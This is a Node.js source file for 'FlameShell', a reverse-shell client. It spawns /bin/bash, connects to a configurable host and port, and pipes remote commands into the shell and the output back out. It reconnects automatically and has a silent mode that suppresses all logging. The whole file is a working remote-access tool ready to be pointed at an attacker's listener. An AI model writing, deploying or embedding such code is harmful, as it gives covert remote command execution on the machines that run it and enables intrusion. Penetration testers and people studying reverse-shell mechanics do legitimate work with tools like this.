#!/bin/node
/* -------------------------------------------------------------------------- */
/*                                   Client                                   */
/* -------------------------------------------------------------------------- */

/* -------------------------------- Settings -------------------------------- */

// The target server to connect to.
const host = '127.0.0.1';

// The port to connect to.
const port = 1337;

// The shell you want to share.
const shell = '/bin/bash';

// If set to true, the client will automatically try to reconnect on disconnect.
const autoReconnect = true;

// Wether or not if logging should be enabled or not. (true = disabled)
const silent = false;

/* ------------------------------ Do Not Touch ------------------------------ */

const version = "1.0.0";

/* ---------------------------------- Code ---------------------------------- */

// import
const net = require('net');

// create a new cmd child process
const { spawn } = require('child_process');
const cmd = spawn(shell);

// save last incoming message
let lastIncoming = '';

// create a new socket client
const client = net.createConnection({host, port});

// connect event handler
client.on('connect', () => {
  // connect event
  console.log(`\x1b[32m[C]\x1b[0m Connection to ${client.remoteAddress}:${client.remotePort} established.`);

  // listen for the cmd data event
  cmd.stdout.on('data', (data) => {
    // check if current data equals the last incoming data
    if (data.toString() == lastIncoming) return;
    
    // send the data to the server
    client.write(data);
  });

  // listen for the client data event
  client.on('data', (data) => {
    lastIncoming = data.toString();
    
    console.log(`\x1b[32m[I]\x1b[0m Received incomming command. Executing...`);

    // redirect it to the cmd stdin
    cmd.stdin.write(data);
  });
});

// handle errors
client.on('error', (err) => {
  // handle ECONNREFUSED error
  if (err.message.includes('ECONNREFUSED'))  {
    console.log(`\x1b[31m[E]\x1b[0m Connection to ${host}:${port} refused.`);
    if (autoReconnect) {
      return setTimeout(() => {
        console.log(`\x1b[32m[C]\x1b[0m Trying to reconnect...`);
        client.connect({port, host});
      }, 1000);
    }
  }

  // handle ECONNRESET error
  if (err.message.includes('ECONNRESET')) {
    console.log(`\x1b[31m[E]\x1b[0m Connection to ${host}:${port} reset.`);
    if (autoReconnect) {
      return setTimeout(() => {
        console.log(`\x1b[32m[C]\x1b[0m Trying to reconnect...`);
        client.connect({port, host});
      }, 1000);
    }
  }

  console.log(`\x1b[31m[E]\x1b[0m ${err}`);
});

// close the connection if the cmd exits
cmd.on('exit', () => {
  console.log(`\x1b[32m[I]\x1b[0m Shell process exited. Closing connection...`);
  client.end();
  process.exit(0);
});

// reconnect if autoReconnect = true and the cmd is still running
cmd.on('close', (code) => {
  if (autoReconnect) return;

  if (cmd.exitCode === null) {
    console.log(`\x1b[32m[I]\x1b[0m Connection closed. Reconnecting...`);
    client.connect(port, host);
  } else {
    console.log(`\x1b[32m[I]\x1b[0m The shell process is no longer running. Exiting...`);
    process.exit(0);
  }
});

// overwrite console.log to only log if silent is disabled
if (silent) console.log = () => {};

// print logo
console.log(
  '\x1b[0m\n' +
  '\x1b[31m ______   __         ______     __    __     ______   \x1b[37m  ______     __  __     ______     __         __        \n' +
  '\x1b[31m/:  ___: /: :       /:  __ :   /: "-./  :   /:  ___:  \x1b[37m /:  ___:   /: :_: :   /:  ___:   /: :       /: :       \n' +
  '\x1b[31m: :  __: : : :____  : :  __ :  : : :-./: :  : :  __:  \x1b[37m : :___  :  : :  __ :  : :  __:   : : :____  : : :____  \n' +
  '\x1b[31m : :_:    : :_____:  : :_: :_:  : :_: : :_:  : :_____:\x1b[37m  :/:_____:  : :_: :_:  : :_____:  : :_____:  : :_____: \n' +
  '\x1b[31m  :/_/     :/_____/   :/_/:/_/   :/_/  :/_/   :/_____/\x1b[37m   :/_____/   :/_/:/_/   :/_____/   :/_____/   :/_____/ \n' +
  `\x1b[0m                                            FlameShell v${version} by Malte Linke\n`
  .replace(':', '\\')
);